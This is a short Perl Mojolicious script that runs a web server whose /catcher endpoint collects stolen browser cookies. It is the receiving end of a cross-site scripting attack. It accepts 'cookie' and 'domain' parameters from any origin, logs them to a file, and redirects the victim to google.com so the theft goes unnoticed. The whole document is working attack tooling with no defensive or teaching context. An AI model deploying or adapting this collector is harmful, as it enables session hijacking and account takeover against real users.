#!/usr/bin/env perl

# Use: perl catcher.pl daemon -m production -l http://*:8080

use 5.018;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/catcher" => sub ($catcher) {
	$catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");

	my $cookie = $catcher -> param("cookie");
	my $domain = $catcher -> param("domain");
	
	open (my $logs, ">>", "catcher.logs");
	print $logs "[+] - New cookie '$cookie' from '$domain' has been catch.\n";
	close ($logs);

	return (
		$catcher -> render (
			text => "<script>window.location='https://google.com';</script>"
		)
	);
};

app -> start();